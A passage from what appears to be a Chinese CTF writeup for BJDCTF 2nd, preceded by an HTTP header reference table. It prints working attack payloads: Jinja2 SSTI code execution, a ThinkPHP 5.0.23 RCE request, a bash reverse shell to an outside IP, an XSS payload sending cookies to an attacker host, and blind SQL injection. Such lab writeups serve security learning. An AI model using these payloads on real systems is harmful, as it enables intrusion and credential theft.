href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E4%BB%A3%E7%90%86">浏览器身份标识字符串</a></td><td align="center"><code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/21.0</code></td><td align="center">常设</td></tr><tr><td align="center">Upgrade</td><td align="center">要求服务器升级到另一个协议。</td><td align="center"><code>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</code></td><td align="center">常设</td></tr><tr><td align="center">Via</td><td align="center">向服务器告知，这个请求是由哪些代理发出的。</td><td align="center"><code>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</code></td><td align="center">常设</td></tr><tr><td align="center">Warning</td><td align="center">一个一般性的警告，告知，在实体内容体中可能存在错误。</td><td align="center"><code>Warning: 199 Miscellaneous warning</code></td><td align="center">常设</td></tr></tbody></table><p><strong>常见的非标准请求字段</strong></p><table><thead><tr><th align="center">字段名</th><th align="center">说明</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">X-Requested-With</td><td align="center">主要用于标识 Ajax 及可扩展标记语言 请求。大部分的JavaScript框架会发送这个字段，且将其值设置为 XMLHttpRequest</td><td align="center"><code>X-Requested-With: XMLHttpRequest</code></td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/%E8%AF%B7%E5%8B%BF%E8%BF%BD%E8%B8%AA">DNT</a>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-12">12]</a></td><td align="center">请求某个网页应用程序停止跟踪某个用户。在火狐浏览器中，相当于X-Do-Not-Track协议头字段（自 Firefox/4.0 Beta 11 版开始支持）。<a href="https://zh.wikipedia.org/wiki/Safari">Safari</a> 和 <a href="https://zh.wikipedia.org/wiki/Internet_Explorer">Internet Explorer</a> 9 也支持这个字段。2011年3月7日，草案提交IETF。[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-13">13]</a> 万维网协会 的跟踪保护工作组正在就此制作一项规范。[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-14">14]</a></td><td align="center"><code>DNT: 1 (DNT启用)``DNT: 0 (DNT被禁用)</code></td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/X-Forwarded-For">X-Forwarded-For</a>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-15">15]</a></td><td align="center">一个事实标准 ，用于标识某个通过超文本传输协议代理或负载均衡连接到某个网页服务器的客户端的原始互联网地址</td><td align="center"><code>X-Forwarded-For: client1, proxy1, proxy2``X-Forwarded-For: 129.78.138.66, 129.78.64.103</code></td></tr><tr><td align="center">X-Forwarded-Host[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-16">16]</a></td><td align="center">一个事实标准 ，用于识别客户端原本发出的 <code>Host</code> 请求头部[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-17">17]</a>。</td><td align="center"><code>X-Forwarded-Host: en.wikipedia.org:80``X-Forwarded-Host: en.wikipedia.org</code></td></tr><tr><td align="center">X-Forwarded-Proto[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-18">18]</a></td><td align="center">一个事实标准，用于标识某个超文本传输协议请求最初所使用的协议。[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-19">19]</a></td><td align="center"><code>X-Forwarded-Proto: https</code></td></tr><tr><td align="center">Front-End-Https[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-20">20]</a></td><td align="center">被微软的服务器和负载均衡器所使用的非标准头部字段。</td><td align="center"><code>Front-End-Https: on</code></td></tr><tr><td align="center">X-Http-Method-Override[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-21">21]</a></td><td align="center">请求某个网页应用程序使用该协议头字段中指定的方法（一般是PUT或DELETE）来覆盖掉在请求中所指定的方法（一般是POST）。当某个浏览器或防火墙阻止直接发送PUT 或DELETE 方法时（注意，这可能是因为软件中的某个漏洞，因而需要修复，也可能是因为某个配置选项就是如此要求的，因而不应当设法绕过），可使用这种方式。</td><td align="center"><code>X-HTTP-Method-Override: DELETE</code></td></tr><tr><td align="center">X-ATT-DeviceId[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-22">22]</a></td><td align="center">使服务器更容易解读AT&amp;T设备User-Agent字段中常见的设备型号、固件信息。</td><td align="center"><code>X-Att-Deviceid: GT-P7320/P7320XXLPG</code></td></tr><tr><td align="center">X-Wap-Profile[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-23">23]</a></td><td align="center">链接到互联网上的一个XML文件，其完整、仔细地描述了正在连接的设备。右侧以为AT&amp;T Samsung Galaxy S2提供的XML文件为例。</td><td align="center"><code>x-wap-profile: http://wap.samsungmobile.com/uaprof/SGH-I777.xml</code></td></tr><tr><td align="center">Proxy-Connection[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-24">24]</a></td><td align="center">该字段源于早期超文本传输协议版本实现中的错误。与标准的连接（Connection）字段的功能完全相同。</td><td align="center"><code>Proxy-Connection: keep-alive</code></td></tr><tr><td align="center">X-Csrf-Token[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-25">25]</a></td><td align="center">用于防止 <a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">跨站请求伪造</a>。 辅助用的头部有 <code>X-CSRFToken</code>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-26">26]</a> 或 <code>X-XSRF-TOKEN</code>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-27">27]</a></td><td align="center"><code>X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql</code></td></tr></tbody></table><p><strong>回应字段</strong></p><table><thead><tr><th align="center">字段名</th><th align="center">说明</th><th align="center">例子</th><th align="center">状态</th></tr></thead><tbody><tr><td align="center">Access-Control-Allow-Origin</td><td align="center">指定哪些网站可参与到跨来源资源共享过程中</td><td align="center"><code>Access-Control-Allow-Origin: *</code></td><td align="center">临时</td></tr><tr><td align="center">Accept-Patch[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-28">28]</a></td><td align="center">指定服务器支持的文件格式类型。</td><td align="center"><code>Accept-Patch: text/example;charset=utf-8</code></td><td align="center">常设</td></tr><tr><td align="center">Accept-Ranges</td><td align="center">这个服务器支持哪些种类的部分内容范围</td><td align="center"><code>Accept-Ranges: bytes</code></td><td align="center">常设</td></tr><tr><td align="center">Age</td><td align="center">这个对象在代理缓存中存在的时间，以秒为单位</td><td align="center"><code>Age: 12</code></td><td align="center">常设</td></tr><tr><td align="center">Allow</td><td align="center">对于特定资源有效的动作。针对HTTP/405这一错误代码而使用</td><td align="center"><code>Allow: GET, HEAD</code></td><td align="center">常设</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E9%A1%B5%E5%BF%AB%E7%85%A7">Cache-Control</a></td><td align="center">向从服务器直到客户端在内的所有缓存机制告知，它们是否可以缓存这个对象。其单位为秒</td><td align="center"><code>Cache-Control: max-age=3600</code></td><td align="center">常设</td></tr><tr><td align="center">Connection</td><td align="center">针对该连接所预期的选项[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-rfc7230_connection-8">8]</a></td><td align="center"><code>Connection: close</code></td><td align="center">常设</td></tr><tr><td align="center">Content-Disposition[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-29">29]</a></td><td align="center">一个可以让客户端下载文件并建议文件名的头部。文件名需要用双引号包裹。</td><td align="center"><code>Content-Disposition: attachment; filename=&quot;fname.ext&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">Content-Encoding</td><td align="center">在数据上使用的编码类型。参考 超文本传输协议压缩 。</td><td align="center"><code>Content-Encoding: gzip</code></td><td align="center">常设</td></tr><tr><td align="center">Content-Language</td><td align="center">内容所使用的语言[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-30">30]</a></td><td align="center"><code>Content-Language: da</code></td><td align="center">常设</td></tr><tr><td align="center">Content-Length</td><td align="center">回应消息体的长度，以 字节 （8位为一字节）为单位</td><td align="center"><code>Content-Length: 348</code></td><td align="center">常设</td></tr><tr><td align="center">Content-Location</td><td align="center">所返回的数据的一个候选位置</td><td align="center"><code>Content-Location: /index.htm</code></td><td align="center">常设</td></tr><tr><td align="center">Content-MD5</td><td align="center">回应内容的二进制 MD5 散列，以 Base64 方式编码</td><td align="center"><code>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</code></td><td align="center">过时的[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-31">31]</a></td></tr><tr><td align="center">Content-Range</td><td align="center">这条部分消息是属于某条完整消息的哪个部分</td><td align="center"><code>Content-Range: bytes 21010-47021/47022</code></td><td align="center">常设</td></tr><tr><td align="center">Content-Type</td><td align="center">当前内容的<a href="https://zh.wikipedia.org/wiki/MIME">MIME</a>类型</td><td align="center"><code>Content-Type: text/html; charset=utf-8</code></td><td align="center">常设</td></tr><tr><td align="center">Date</td><td align="center">此条消息被发送时的日期和时间(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</td><td align="center"><code>Date: Tue, 15 Nov 1994 08:12:31 GMT</code></td><td align="center">常设</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/HTTP_ETag">ETag</a></td><td align="center">对于某个资源的某个特定版本的一个标识符，通常是一个 消息散列</td><td align="center"><code>ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">Expires</td><td align="center">指定一个日期/时间，超过该时间则认为此回应已经过期</td><td align="center"><code>Expires: Thu, 01 Dec 1994 16:00:00 GMT</code></td><td align="center">常设: 标准</td></tr><tr><td align="center">Last-Modified</td><td align="center">所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</td><td align="center"><code>Last-Modified: Tue, 15 Nov 1994 12:45:26 GMT</code></td><td align="center">常设</td></tr><tr><td align="center">Link</td><td align="center">用来表达与另一个资源之间的类型关系，此处所说的类型关系是在 RFC 5988 中定义的</td><td align="center"><code>Link: ; rel=&quot;alternate&quot;</code>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-google_canonical-32">32]</a></td><td align="center">常设</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/HTTP_Location">Location</a></td><td align="center">用来 进行重定向，或者在创建了某个新资源时使用。</td><td align="center"><code>Location: http://www.w3.org/pub/WWW/People.html</code></td><td align="center">常设</td></tr><tr><td align="center">P3P</td><td align="center">用于支持设置<a href="https://zh.wikipedia.org/wiki/P3P">P3P</a>策略，标准格式为“<code>P3P:CP=&quot;your_compact_policy&quot;</code>”。然而P3P规范并不成功，[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-33">33]</a>大部分现代浏览器没有完整实现该功能，而大量网站也将该值设为假值，从而足以用来欺骗浏览器的P3P插件功能并授权给第三方Cookies。</td><td align="center"><code>P3P: CP=&quot;This is not a P3P policy! ``See http://www.google.com/support/accounts/bin/answer.py?hl=en&amp;answer=151657 for more info.&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">Pragma</td><td align="center">与具体的实现相关，这些字段可能在请求/回应链中的任何时候产生多种效果。</td><td align="center"><code>Pragma: no-cache</code></td><td align="center">常设</td></tr><tr><td align="center">Proxy-Authenticate</td><td align="center">要求在访问代理时提供身份认证信息。</td><td align="center"><code>Proxy-Authenticate: Basic</code></td><td align="center">常设</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/HTTP%E5%85%AC%E9%92%A5%E5%9B%BA%E5%AE%9A">Public-Key-Pins</a>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-34">34]</a></td><td align="center">用于缓解<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB">中间人攻击</a>，声明网站认证使用的<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE">传输层安全协议</a>证书的散列值</td><td align="center"><code>Public-Key-Pins: max-age=2592000; pin-sha256=&quot;E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=&quot;;</code></td><td align="center">常设</td></tr><tr><td align="center">Refresh</td><td align="center">用于设定可定时的重定向跳转。右边例子设定了5秒后跳转至“<code>http://www.w3.org/pub/WWW/People.html</code>”。</td><td align="center"><code>Refresh: 5; url=http://www.w3.org/pub/WWW/People.html</code></td><td align="center">专利并非标准Netscape实现的扩展，但大部分网页浏览器也支持。</td></tr><tr><td align="center">Retry-After</td><td align="center">如果某个实体临时不可用，则，此协议头用来告知客户端日后重试。其值可以是一个特定的时间段(以秒为单位)或一个超文本传输协议日期。 [<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-35">35]</a></td><td align="center">Example 1: <code>Retry-After: 120</code>Example 2: <code>Retry-After: Fri, 07 Nov 2014 23:59:59 GMT</code></td><td align="center">常设</td></tr><tr><td align="center">Server</td><td align="center">服务器的名字</td><td align="center"><code>Server: Apache/2.4.1 (Unix)</code></td><td align="center">常设</td></tr><tr><td align="center">Set-Cookie</td><td align="center"><a href="https://zh.wikipedia.org/wiki/Cookie">HTTP cookie</a></td><td align="center"><code>Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</code></td><td align="center">常设: 标准</td></tr><tr><td align="center">Status</td><td align="center">通用网关接口 协议头字段，用来说明当前这个超文本传输协议回应的 状态 。普通的超文本传输协议回应，会使用单独的“状态行”（”Status-Line”）作为替代，这一点是在 RFC 7230 中定义的。 [<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-36">36]</a></td><td align="center"><code>Status: 200 OK</code></td><td align="center">Not listed as a <a href="http://www.iana.org/assignments/message-headers/message-headers.xml">registered field name</a></td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/HTTP%E4%B8%A5%E6%A0%BC%E4%BC%A0%E8%BE%93%E5%AE%89%E5%85%A8">Strict-Transport-Security</a></td><td align="center">HTTP 严格传输安全这一头部告知客户端缓存这一强制 HTTPS 策略的时间，以及这一策略是否适用于其子域名。</td><td align="center"><code>Strict-Transport-Security: max-age=16070400; includeSubDomains</code></td><td align="center">常设: 标准</td></tr><tr><td align="center">Trailer</td><td align="center">这个头部数值指示了在这一系列头部信息由由<a href="https://zh.wikipedia.org/wiki/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BC%96%E7%A0%81">分块传输编码</a>编码。</td><td align="center"><code>Trailer: Max-Forwards</code></td><td align="center">常设</td></tr><tr><td align="center">Transfer-Encoding</td><td align="center">用来将实体安全地传输给用户的编码形式。当前定义的方法包括：分块（chunked）、compress、deflate、gzip和identity。</td><td align="center"><code>Transfer-Encoding: chunked</code></td><td align="center">常设</td></tr><tr><td align="center">Upgrade</td><td align="center">要求客户端升级到另一个协议。</td><td align="center"><code>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</code></td><td align="center">常设</td></tr><tr><td align="center">Vary</td><td align="center">告知下游的代理服务器，应当如何对未来的请求协议头进行匹配，以决定是否可使用已缓存的回应内容而不是重新从原始服务器请求新的内容。</td><td align="center"><code>Vary: *</code></td><td align="center">常设</td></tr><tr><td align="center">Via</td><td align="center">告知代理服务器的客户端，当前回应是通过什么途径发送的。</td><td align="center"><code>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</code></td><td align="center">常设</td></tr><tr><td align="center">Warning</td><td align="center">一般性的警告，告知在实体内容体中可能存在错误。</td><td align="center"><code>Warning: 199 Miscellaneous warning</code></td><td align="center">常设</td></tr><tr><td align="center">WWW-Authenticate</td><td align="center">表明在请求获取这个实体时应当使用的认证模式。</td><td align="center"><code>WWW-Authenticate: Basic</code></td><td align="center">常设</td></tr><tr><td align="center">X-Frame-Options[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-37">37]</a></td><td align="center"><a href="https://zh.wikipedia.org/wiki/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81">点击劫持</a>保护：<code>deny</code>：该页面不允许在 frame 中展示，即使是同域名内。<code>sameorigin</code>：该页面允许同域名内在 frame 中展示。<code>allow-from *uri*</code>：该页面允许在指定uri的 frame 中展示。<code>allowall</code>：允许任意位置的frame显示，非标准值。</td><td align="center"><code>X-Frame-Options: deny</code></td><td align="center">过时的[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-38">38]</a></td></tr></tbody></table><p><strong>常见的非标准回应字段</strong></p><table><thead><tr><th align="center">字段名</th><th align="center">说明</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">X-XSS-Protection[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-39">39]</a></td><td align="center">跨站脚本攻击 （XSS）过滤器</td><td align="center"><code>X-XSS-Protection: 1; mode=block</code></td></tr><tr><td align="center">Content-Security-Policy, <em>X-Content-Security-Policy</em>, <em>X-WebKit-CSP</em>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-40">40]</a></td><td align="center"><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5">内容安全策略</a>定义。</td><td align="center"><code>X-WebKit-CSP: default-src &#39;self&#39;</code></td></tr><tr><td align="center">X-Content-Type-Options[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-41">41]</a></td><td align="center">唯一允许的数值为”nosniff”，防止 <a href="https://zh.wikipedia.org/wiki/Internet_Explorer">Internet Explorer</a> 对文件进行MIME类型嗅探。这也对 <a href="https://zh.wikipedia.org/wiki/Google_Chrome">Google Chrome</a> 下载扩展时适用。[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-42">42]</a></td><td align="center"><code>X-Content-Type-Options: nosniff</code></td></tr><tr><td align="center">X-Powered-By[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-43">43]</a></td><td align="center">表明用于支持当前网页应用程序的技术（例如：PHP）（版本号细节通常放置在 X-Runtime 或 X-Version 中）</td><td align="center"><code>X-Powered-By: PHP/5.4.0</code></td></tr><tr><td align="center">X-UA-Compatible[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-44">44]</a></td><td align="center">推荐指定的渲染引擎（通常是向后兼容模式）来显示内容。也用于激活 Internet Explorer 中的 <a href="https://zh.wikipedia.org/wiki/Google_Chrome_Frame">Chrome Frame</a>。</td><td align="center"><code>X-UA-Compatible: IE=EmulateIE7</code> <code>X-UA-Compatible: IE=edge</code> <code>X-UA-Compatible: Chrome=1</code></td></tr><tr><td align="center">X-Content-Duration[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-45">45]</a></td><td align="center">指出音视频的长度，单位为秒。只受Gecko内核浏览器支持。</td><td align="center"><code>X-Content-Duration: 42.666</code></td></tr></tbody></table><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>查看源码发现qaq,访问提示ssti</p><p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200321184958.png"></p><p>直接用vulhub上的payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>就能得到flag</p><h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><p>提示thinkphp5，5.0.23 RCE的payload可以读flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">#命令执行</span><br><span class="line">POST：_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><p>打开提示swp,访问<code>.index.php.swp</code>，下载下来 <code>vi -r</code>恢复得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到没过滤管道和空格</p><p>由于buu靶机不能访问内网，新建一个小号去basic里找到linux-labs</p><p>新建一个index.php,写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.55.214&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然后起一个web服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:8000</span><br></pre></td></tr></table></figure><p>nc监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321195223.png" style="zoom:80%;"><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321195320.png" style="zoom:80%;"><h3 id="xss之光"><a href="#xss之光" class="headerlink" title="xss之光"></a>xss之光</h3><p>扫目录发现.git源码泄露，恢复源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line">$b = unserialize($a);</span><br></pre></td></tr></table></figure><p>题目考察的知识点是php原生类反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a =<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.open(&#x27;http://vps/?a=&#x27;+document.cookie)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200324172728.png" style="zoom:80%;"><h3 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h3><p>fuzz一波发现过滤了好多东西</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200322153408.png" style="zoom:80%;"><p>union select 单双引号 =号都过滤了</p><p>扫路径扫到robots.txtl里面hint.txt里有</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">&#x27;$_POST[&quot;username&quot;]&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$_POST[&quot;password&quot;]&#x27;</span></span><br></pre></td></tr></table></figure><p>我们就可以加个转义符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;admin\&#39; and password&#x3D;&#39;$password&#39;</span><br></pre></td></tr></table></figure><p>此时username的值就被认为是<code>admin\&#39; and password=</code></p><p><code>$password</code>传 <code>or sleep(3)%23</code>发现能够延时，所以我们在sleep(3)传入注入语句</p><p><strong>payload:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or if((ascii(substr((&#123;1&#125;),&#123;&#125;,1)) regexp &#123;&#125;),1,0)#</span><br></pre></td></tr></table></figure><p>由于表中只有一条数据，所以我们在1位置直接传字段的名字就能跑出数据了</p><p>简单做个实验</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> (<span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">10</span>),username <span class="built_in">varchar</span>(<span class="number">50</span>),<span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">50</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">test</span> (<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span 